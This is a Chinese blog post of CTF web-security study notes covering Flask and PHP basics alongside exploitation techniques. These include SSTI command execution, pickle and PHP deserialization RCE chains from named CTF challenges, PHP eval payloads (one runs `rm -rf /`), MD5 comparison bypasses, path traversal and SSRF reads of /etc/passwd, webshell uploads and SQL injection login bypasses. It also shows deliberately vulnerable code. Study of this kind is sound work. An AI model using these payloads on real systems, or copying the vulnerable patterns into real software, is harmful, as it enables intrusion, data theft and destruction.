---
title: "WEB笔记"
description: 
date: 2024-10-09
image: /img/note.jpg
math: 
license: 
hidden: false
comments: true
draft: false
categories:
    - notes
    - web

typora-root-url: ..\..\..\..\..\static
---

寻找文件：`/tmp`，`env`，`/etc/passwd`

找文件名：`find / -name "`*`flag`*`.txt"`

## 工具

### HackBar

```
devtools
X-Forwarded-For: 127.0.0.1 // 只允许本机登录
// 识别通过HTTP代理或负载均衡器连接到Web服务器的客户端的原始IP地址
User Agent: // 向服务器发出请求的客户端软件
Referer: // 链接到当前请求页面的前一个网页的URL
```

### Burpsuite

Intruder模块：可以多线程对URL或data中的参数进行**爆破**

### dig

用于从域名系统（DNS）服务器中收集信息，在线网站：`https://tool.lu/dns/index.html`

## Python

### 基础知识

```Python
for index, num in enumerate(num_list): # num_list = [xx, xx]
    xxx # 可以获取索引和内容
secure_filename(file_name) # 清理文件名，去除潜在恶意字符
files.seek(0) # 重置文件指针到开头
timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S') # 格式化输出时间
uuid.uuid4() # 通用唯一标识符（Universally Unique Identifier）
os.environ # 查看系统环境变量
```

**图片处理**

```Python
mimetypes.guess_type(file_path)[0] # 根据文件路径扩展名推断MIME类型
with Image.open(file_path) as img: # 图片打开 返回img对象
    mime = img.get_format_mimetype() # 获取MIME类型
```

**类**

```Python
def __repr__(self) -> str: # 重写自我描述信息, print时打印内容
    return f"xxx"
```

**Flask**

```Python
app = Flask(__name__, template_folder='another') # 初始化flask应用 
# 默认html模版文件在templates文件夹中, 此处指定为another
app.config['some'] = xxx # 配置
app.run(host='0.0.0.0', port=5000) # 启动应用

@app.route('/hello', methods=['POST']) # 设置路由及函数
def func():
    if xx not in request.files: # files是字典
        return '错误信息', 400 # 状态码
    return redirect(url_for('index')) # 重定向到主页
    return render_template("index.html", id = "xx") # 返回模版及id参数
    
request.method # "POST"
request.files.get('key', None) # 字典找键, 未找到返回None
```

**Jinja2-模板引擎**

```Python
# 自定义模板加载
env = Environment(loader=FileSystemLoader('static'), autoescape=True)
# 加载方式: FileSystemLoader 从 static 文件夹中加载模板文件".html"等
# autoescape=True 安全机制:  XML/HTML 自动转义特殊字符防止XSS攻击

# 重定义 渲染函数
def render_template(template_name, **context): # context是关键字参数, 如name="Alice", age=30
    template = env.get_template(template_name) # 加载模板
    return template.render(**context) #  context 字典渲染模板
```

### Debug命令执行

Flask框架，已知`PIN`码的情况下，访问`http://xxx.xxx/console`进入控制台输入`PIN`码进行RCE

```Python
import os
os.chdir('path') # 切换目录
os.remove(file) # 删除文件
os.rmdir(directory) # 删除目录
os.makedirs('xx', exist_ok=True) # 创建目录 目标已存在不会抛出异常
os.path.exists('x') # 判断目录是否存在
for path, dirs, files in os.walk(folder, topdown=False): # 分别返回目录路径, 当前目录所有子目录名, 当前目录所有文件名, 从下到上遍历
file_save_path = os.path.join(folder, file) # 构建文件保存路径
file.save(file_save_path) # 文件保存在路径中
os.path.relpath(file_path, folder]) # 将文件绝对路径替换为关于folder的相对路径
# debug终端下, 直接输入os.system('xx')只会返回0, 表示成功
import subprocess

# 命令列表形式传入
result = subprocess.run(['cat', 'flag'], 
            stdout=subprocess.PIPE,  # 捕获标准输出
            stderr=subprocess.PIPE)  # 捕获标准错误
print(result.stdout.decode())  # 显示 cat flag 命令输出
```

### SSTI模板注入

**漏洞点**

```Python
# {{id | safe}} 中 safe 表示值直接插入到HTML中, 不做任何转义, 可造成SSTI攻击
evil = content.replace('{{id | safe}}', id) # 将模板内容中的{{id | safe}}替换为id
return render_template_string(evil) # 将替换后的字符串作为Jinja2模板渲染
```

测试是否是SSTI：`{{7 * 7}}` 是否返回 `49`

**os模块执行命令**

```Python
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
# 配置对象 > 类 > 初始化构造函数 > 全局命名空间 > os.popen('whoami').read() 执行命令
```

### 反序列化漏洞

**Pickel序列化及反序列化**

```Python
class Pet:
    def __init__(self, name, species) -> None:
        self.name = name
        self.species = species

pet = Pet(name, species)

# 序列化
serialized_pet = base64.b64encode(pickle.dumps(pet)).decode("utf-8")

# 反序列化
pet_data = base64.b64decode(serialized_pet)
pet = pickle.loads(pet_data)
```

RCE payload构造

```Python
class exp:
    # # __reduce__() 序列化时返回一个元组(可调用函数和参数元组)，反序列化时参数传递调用该函数
    def __reduce__(self): 
        return (os.system, ("whoami",))

malicious_payload = pickle.dumps(exp())
encoded_payload = base64.b64encode(malicious_payload).decode('utf-8')
```

无回显时考虑替换全局变量，在网页中的某变量中显示信息

```Python
class exp:
    def __reduce__(self):
        return (exec, ('import os; global store; store = os.environ["FLAG"]',))
# python在局部改变全局变量时需要声明 global
```

### 文件包含漏洞

```Plain
# 直接访问服务器内部某端口文件
http://xxx/image?url=http://localhost:5728/image/flag.jpg 
```

### 爬虫

**网页请求**

**网页请求**

```Python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'application/json'
}

proxies = { # 代理查看http包
    'http': 'http://127.0.0.1:8080',
    # 'https': 'https://https_proxy:port'
}

data = {
    "arg1":"val1",
    "arg2": "val2",
    "arg3": f"{a_variable}"
}

# get
response = requests.get("https://url", headers=headers, cookies=cookies)
# post
response = requests.post("http://127.0.0.1:32585", headers=headers, json=data, proxies=proxies) # json形式上传
response = requests.post("http://127.0.0.1:32585", headers=headers, data=data, proxies=proxies) # xx=xx&xx=xx形式上传

cookies = response.cookies # 获取cookies
if response.status_code == 200:
    print(response.text)
    print(cookies.get_dict())
else:
    print(f"状态码: {response.status_code}")
```

**爬虫匹配**

```Python
from bs4 import BeautifulSoup

soup = BeautifulSoup(html_content, 'html.parser')
h1_tag = soup.find('h1', id='status')  # <h1 id="status">

if h1_tag:
    status_text = h1_tag.get_text(strip=True) # 获取标签内容并去除多余空白
    print(status_text)
```

### 路径遍历漏洞

```PHP
xxx.com?path=../../../../../../../../etc/passwd
```

## PHP

环境搭建，在PHPSTUDY中的**WWW**界面下放入文件夹及代码即可

### 基础知识

php版本7.3.22爬虫，首先检查`robots.txt(表示网站不希望哪些页面被爬取), source.txt`

一些**基础代码**

```PHP
<?php

error_reporting(0); // 关闭所有错误报告
session_start(); // 允许脚本访问和修改用户的会话数据

highlight_file("xx.php"); // 将PHP代码高亮显示在网页
isset() // 判断一个变量是否已被设置, 且不为 null
die('FAIL'); // 终止程序并输出
$arr=array($x, "1"); // 数组[ $x, "1" ]

strpos($content, $string); // 返回string在content第一次出现的索引, 否则返回false

// PHP 数组或对象编码为 JSON 格式的字符串
echo json_encode(array('status' => 0, 'info' => 'hello'));

unset($arr); // 清除变量
exit; // 终止脚本执行

// 终端 php xx.php 执行
```

**http**

```PHP
// a变量值
$_POST['a'] // post请求 若为数组某值构造 : a[xxx]=xxx
$_GET['a']  // get请求

preg_match('/flag/', $_GET['a'])// 检查是否存在匹配 flag 的子串
// /flag/i   i 忽略大小写匹配, 即FlaG也会匹配
preg_match("/[a-zA-Z0-9]+\./", $b)
// [a-zA-Z0-9]+   [x]: 表示匹配其中任何一个字符  +: 匹配前面一次或多次
// \.: 匹配 .  因为只有 . 是匹配任何字符, 此处转义


header('Content-Type: ' . $mime_type); // 设置指定 HTTP 响应头
```

**网络编程**

```PHP
$ch = curl_init(); // 初始化 cURL 会话句柄

// 设置 cURL 选项
curl_setopt($ch, CURLOPT_URL, $url);             // 请求的url
curl_setopt($ch, CURLOPT_HEADER, false);         // 不获取响应头
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // 返回响应内容,不直接输出到控制台
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  // 自动跟随重定向 URL
    
$res = curl_exec($ch); // 执行 cURL 请求
curl_close($ch);
```

**图片处理**

```PHP
$image_info = getimagesizefromstring($res); // 解析二进制数据, 获取图片信息
// 返回7值数组: [宽度][高度][图像类型常数之一][height="yyy" width="xxx"][bits:每种颜色的位数][MIME 类型]
$mime_type = $image_info['mime'];
```

**文件读写**

```PHP
$content = file_get_contents("filename.txt");
file_put_contents("filename.txt", "New content");
```

**绕过**

```PHP
if (!is_numeric($a) && !is_numeric($b)) { // a和b不是数值
    if ($a == 0 && md5($a) == $b[$a]){}
} // 可以通过 a = false = 0
```

### PHP伪协议

URL格式：`scheme://user:password@address:port/path?query#fragment`

**data://**

PHP>=5.2.0，可使用`data://`数据流封装器传递数据

```PHP
$a = $_POST['a'];
if (file_get_contents($pen) !== 'hello')
data://text/plain,hello        读取出 'hello'
data://text/plain;base64,xx    xx Base64 解码后读出内容
```

**php://filter**   读取源代码并进行base64编码输出

```PHP
include($a);
php://filter/read=convert.base64-encode/resource=flag.php
```

### 远程命令执行

RCE，Remote Command Execution

```PHP
eval($_POST['what']);
```

**利用**

```PHP
what=<?php system('rm -rf /'); ?> // 删除系统所有文件
what=echo getcwd(); // 查看当前目录
what=print_r(scandir(getcwd())); // 查看当前目录所有文件和目录
what=print_r(scandir('../'));    // 查看上一目录所有文件和目录
what=echo file_get_contents('filename.txt'); // 查看文件内容
```

**无参函数RCE**

```PHP
if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\/|zip:\/\//i', $cmd))
// 禁用协议
if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $cmd))
// 只能为无参函数嵌套形式: func(fun(h()));
if (!preg_match('/pwd|tac|cat|chr|ord|ls|dir|conv|info|hex|bin|rand|array|source|file|cwd|dfined|system|assert|sess/i',$cmd))
// 黑名单过滤cmd

@eval($cmd);
```

**getallheaders()绕过————**返回当前请求的所有请求头信息（限Apache）

`var_dump(end(getallheaders()));`测试是否可以获取到返回信息

```PHP
?cmd=eval(end(getallheaders())); // url

// 及在burp数据包下最后一行加入以下任何一个进行命令执行
sky: phpinfo();
sky: system("ls");
```

### MD5绕过

MD5 碰撞：两个不同的字符串 MD5 哈希值相等

**php弱类型比较: 构造md5值为0e开头的科学计数法**

```PHP
if ($name != $password && md5($name) == md5($password))
```

payload：

```Plain
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
```

**php强类型比较: 构造数组**

```PHP
if ($name !== $password && md5($name) === md5($password))
// 0e字符串无法绕过 而 md5 函数传入数组的返回值都是NULL
```

payload：

```Plain
url: &name[]=1
```

### 反序列化漏洞

**序列化**

- 序列化：对象转换为字节序列，为保存对象方便重用
- 反序列化：字节序列恢复为对象

```PHP
$c = serialize($arr);
$a = unserialize($_GET['data']); // 已序列化的字符串还原为PHP的原始数据类型或对象
```

**序列化格式**

```PHP
O:4:"Test":2:{s:1:"a";s:5:"Hello";s:1:"b";i:20;}
对象类型:长度:"名字":类中变量的个数:{类型:长度:"名字";类型:长度:"值";......}
```

**类型字母**

```PHP
a - array                  b - boolean  
d - double                 i - integer
o - common object          r - reference
s - string                 C - custom object
O - class                  N - null
R - pointer reference      U - unicode string
```

**魔术方法**

当这些方法在某个类test中，如只有在test类中含有__invoke，某函数将对象当作函数调用触发才成功

```PHP
public function __construct(){} // 构造函数 new一个类实例对象时调用
public function __destruct(){} // 析构函数 某对象的所有引用都被删除或对象被显式销毁时执行
public function __invoke(){} // 尝试将对象当作函数调用时触发
public function __set($a, $b){} // 魔术方法: 尝试给一个不存在或不可访问的属性赋值时被调用
// $a: 属性名 $b: 值
public function __toString(){} // 当对象被当作字符串使用时调用 比如 echo一个对象
public function __wakeup(){}   // 序列化字符串被反序列化时调佣
public function __sleep(){}    // 对象被序列化时调用
```

**对象注入漏洞**

操作序列化的对象来执行任意代码

**两**个条件：

- 必须具有一个实现PHP魔术方法的类
- 攻击中使用的所有类都必须在调用易受攻击的`unserialize()`时声明

**例题——moectf2024【pop moe】**

```PHP
<?php
class class000 {
    private $payl0ad = 0;
    protected $what;

    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if($this->payl0ad === 0)
        {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}

class class001 {
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}

class class002 {
    private $sec;
    public function __set($a, $b)
    {
        $this->$b($this->sec);
    }

    public function dangerous($whaattt)
    {
        $whaattt->evvval($this->sec);
    }

}

class class003 {
    public $mystr;
    public function evvval($str)
    {
        eval($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}

if(isset($_GET['data'])){
    $a = unserialize($_GET['data']);
}
```

构造链的过程：

```
__destruct()` > `check()`【payl0ad为1】 > 【what为class001】对象作为函数调用 > `__invoke()` > 【payl0ad为dangerous, a为class001】为不存在的payload赋值 > `__set(payload, dangerous)` > `dangerous(this->sec)` > 【sec为class003, 作为whaattt执行->evvval(class003)】 > 对象作为字符串 > `__toString()`返回mystr【mystr为执行的命令】 > `eval(mystr)
```

最终构造的`data`展开：

```PHP
O:8:"class000":2:{
    s:7:"payl0ad";i:1;
    s:4:"what";O:8:"class001":2:{
        s:7:"payl0ad";s:9:"dangerous";
        s:1:"a";O:8:"class002":1:{
            s:3:"sec";O:8:"class003":1:{
                s:5:"mystr";s:10:"phpinfo();";
            };
        };
    };
}
```

假设没有eval函数的情况，使用`system(ls)`命令进行RCE

**字符注入**

`mb_strpos`与`mb_substr`连用导致字符注入

```PHP
function substrstr($data){
    $start = mb_strpos($data, "["); // 字符 "[" 首次出现的索引, 否则false
    $end = mb_strpos($data, "]");
    
    return mb_substr($data, $start, $end + 1 - $start);// 多字节字符集的子字符串提取
}   // '[' 开始 ']' 结束的所有字符

$key = substrstr($_GET[0]."[helloJshirobro]"); // 注入点
echo $key
// ?0=%9f              start=0, end=6, key=?[hello ?是字符乱码
// ?0=%f0              start=1, end=7, key=llo]
// ?0=%9f%9f%9f%9fabcd start=4, end=10, key=abcd[he
// ?0=%f0abc%9f        start=4, end=10, key=ello] 效果类似右移(3-1)位
// %f0abc%0abc%9f:效果为右移(2*3-1)位
```

**任意字符串构造**

- **`%9f`不解析，造成字符串后移一位：%9f数量等于要构造的字符串长度`%9f%9fab`**
- **`%f0`**吞掉字符串三位：%f0加随便三个字符，结合%9f的后移，**`%f0abc%9f`**达到字符串逃逸

注：`substrtr`函数逃逸出的字符不能大于原来的字符数量，此时可通过其他`GET`传入增加字符数量

payload构造：

```PHP
?get1=(增加字符数量, 任意值)&read=(n个%9f)(序列化字符串)
```

**增长字符逃逸**

```PHP
function filter($str){
    return str_replace('bb', 'ccc', $str); // n个bb将会多n个字符
}

class A{
    public $name='aaaabb';
    public $pass='123456';
}

$AA=new A();
echo serialize($AA)."\n"; 
// O:1:"A":2:{s:4:"name";s:6:"aaaabb";s:4:"pass";s:6:"123456";} 
echo filter(serialize($AA));
// O:1:"A":2:{s:4:"name";s:6:"aaaaccc";s:4:"pass";s:6:"123456";}
// s 多一个字符, 但只能解析6个, 逃逸了一个c
```

通过逃逸修改pass，payload为25个字符，即前加入25个'bb'，每个逃逸一个字符

```PHP
$name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:4:"hack";}'
//$name: ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
//$pass: hack       
```

**例题——NepCTF2024【PHP_MASTER!!】**

打入`payload`：URL( 47个%00, 即47个'\0' 增长型字符逃逸)

```PHP
?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}&nep1=%f0123%f0123%f0123%9f%9f%f0123&nep=Nep
// ";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}} 长度为47 增长逃逸47字符
<?php
function substrstr($data){
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start); // 变式
}

class B
{
    public $b;
    public function __tostring(){
        if (preg_match("/\[|\]/i", $_GET['nep'])) {
            die("NONONO!!!");
        }
        $str = substrstr($_GET['nep1'] . "[welcome to" . $_GET['nep'] . "CTF]");
        // 原: %f0123%f0123%f0123%9f%9f%f0123[Welcome toNepCTF]
        // 后: str = NepCTF] 效果:右移3*3个,左移2次,右移3个
        if ($str === 'NepCTF]') {
            return ($this->b)(); // b为phpinfo, 可以执行phpinfo;
        }
    }
}
class C
{
    public $s;
    public $str;
    public function __construct($s){
        $this->s = $s;
    }

    public function __destruct(){
        echo $this->str; // str为对象, 将对象作为字符串输出调用_tostring
    }
}
$ser = serialize(new C($_GET['c']));
// $_GET['c']: ";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}绕过
// $ser: O:1:"C":2:{s:1:"s";s:94:"";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}";s:3:"str";N;}
$data = str_ireplace("\0", "00", $ser); // 不区分大小写 字符串替换
// $data: O:1:"C":2:{s:1:"s";s:94:"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}";s:3:"str";N;}
unserialize($data);
```

此时构建的结构为：

```PHP
O:1:"C":2:{
    s:1:"s";s:94:"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
    s:3:"str";O:1:"B":1:{
        s:1:"b";s:7:"phpinfo";
    }
} ";s:3:"str";N;} 忽略了
```

### SSRF漏洞

**漏洞点**

```PHP
$url = $_GET['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
$res = curl_exec($ch); // 获取指定 URL 内容并输出
```

**特殊文件协议**

```Plain
http://target.com/script.php?url=file:///etc/passwd
尝试让服务器本身执行命令
```

### 文件上传漏洞

**文件操作**

```PHP
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $uploadDir = "uploads/"; // 上传目录
    if (!file_exists($uploadDir)) {
        mkdir($uploadDir, 0777, true); // 创建目录
    }

    if (!empty($_FILES['image']['name'])) {
        // $_FILES 超级全局数组, 专用于处理文件上传
        $fileName = basename($_FILES['image']['name']); // 文件名
        
        $allowedTypes = ['image/jpeg', 'image/png', 'image/gif']; // 文件验证
        $fileType = $_FILES['image']['type'];
        if (!in_array($fileType, $allowedTypes)) {
            die('Error: Unsupported file type.');
        }

        $maxSize = 2 * 1024 * 1024; // 2MB
        $fileSize = $_FILES['image']['size']; // 文件大小限制
        if ($fileSize > $maxSize) {
            die('Error: File size is too large.');
        }

        // 构建完整文件路径
        $filePath = $uploadDir . $fileName; // . 用于PHP字符串拼接

        // 移动文件到指定目录
        if (move_uploaded_file($fileTmpName, $filePath)) {
            echo "上传图片在：" . $filePath;
        } else {
            echo "上传失败";
        }
    } else {
        echo "无文件上传";
    }
}
```

上传一句话木马到相应目录中，使用蚁剑连接【url为文件地址，密码为post中数据】

`https://www.cnblogs.com/ash-33/p/16397536.html`中有一些一句话木马

**图片木马**

在`cmd`中运行`copy pho.png/b+hello.php/a hack.png`将图片和php木马结合

**文件上传抓包**

将下面`filename`改为`hack.php`即可

```PHP
Content-Type: multipart/form-data; boundary=---------------------------1104904014997412098933705552
Content-Length: 727
DNT: 1
Connection: close
Referer: http://127.0.0.1:40349/
Priority: u=0

-----------------------------1104904014997412098933705552
Content-Disposition: form-data; name="image"; filename="hack.php"
Content-Type: image/png
xxxxxx
-----------------------------1104904014997412098933705552--
```

### SQL注入漏洞

**MySQL中的注释：**

- `#`，直接加注释内容
- `--`，`--`注释符后需要加一个空格，注释才能生效
- `/* */`，多行注释符

**`php`连接`mysql`**

```PHP
$pwd = $_POST['pwd'];
$pwd = md5($pwd);
    
$conn = mysqli_connect("主机名", "用户名", "密码", "数据库名", 端口);
$sql = "SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'";
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_array($result);

if ($row) {}
```

此处可使用`payload`：

1. 万能密码型：`admin' or 1 = 1#`
   1. `SELECT * FROM admin WHERE email='a@e.com'OR 1 = 1# AND pwd='$pwd'`
2. 联合型：`b' UNION SELECT * FROM admin WHERE 1 = 1-- `
   1. `SELECT * FROM admin WHERE email='a@e.com' UNION SELECT * FROM admin WHERE 1 = 1-- AND pwd='$pwd'`
3. 万能密码2型：`admin' = ''-- `即 False='' 恒成立
   1. **`SELECT * FROM admin WHERE email='a@e.com' = ''-- AND pwd='$pwd'`**